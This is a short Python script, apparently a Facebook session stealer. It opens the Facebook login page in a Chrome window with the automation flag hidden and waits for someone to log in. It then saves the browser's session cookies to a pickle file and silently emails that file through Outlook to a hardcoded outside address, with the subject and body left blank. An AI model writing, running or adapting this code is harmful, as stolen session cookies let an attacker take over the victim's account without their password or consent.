from pickle import TRUE
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time
import pickle
import win32com.client as win32
import os

PATH = os.getcwd() + "\chromedriver.exe"
picture_options = Options()
picture_options.add_experimental_option("excludeSwitches", ["enable-automation"])
picture_options.add_argument("--start-maximized")
init = webdriver.Chrome(PATH, chrome_options=picture_options)

init.get("https://es-la.facebook.com/login/device-based/regular/login/")

enter_button = WebDriverWait(init, 500).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]/div/div/div[1]')))

cookies_file_fb = "cookies9.pkl"
pickle.dump(init.get_cookies() , open(cookies_file_fb,"wb"))

cookie_path = os.getcwd() + "\cookies9.pkl"
# print('getcwd:      ', os.getcwd())
time.sleep(10)

outlook = win32.Dispatch('outlook.application')
mail = outlook.CreateItem(0)
mail.To = 'santiagovp16@outlook.com'
mail.Subject = f'----'
mail.Body = '----'
mail.HTMLBody = (f'----') #this field is optional
mail.Attachments.Add(Source=cookie_path)
mail.Send()
print("melo")
